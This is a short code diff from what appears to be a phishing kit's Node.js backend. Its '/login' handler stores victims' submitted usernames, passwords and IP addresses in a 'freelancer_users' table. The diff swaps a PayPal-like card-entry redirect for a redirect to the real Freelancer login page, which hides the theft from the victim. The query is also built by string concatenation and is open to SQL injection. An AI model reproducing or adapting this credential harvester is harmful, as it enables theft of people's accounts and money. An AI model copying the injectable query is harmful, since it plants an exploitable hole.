@@ -53,7 +53,7 @@ app.post('/login',function(req,res){
     req.socket.remoteAddress ||
     (req.connection.socket ? req.connection.socket.remoteAddress : null);
     client.query("INSERT INTO freelancer_users (users,password,ip) VALUES ('"+a+"','"+b+"','"+ip+"')",function(err,result){});
-    res.redirect('/confirm/myaccount/money/flow/cards/ new/manual?flow=eyJyZXR1cm5VcmwiOiIvYnVzaW5lc3NleHAvbW9uZXkiLCJjYW5jZWxVcmwiOiIvYnVzaW5lc3NleHAvbW9uZXkifQ==');
+    res.redirect('https://www.freelancer.com/login');
 })
 
 
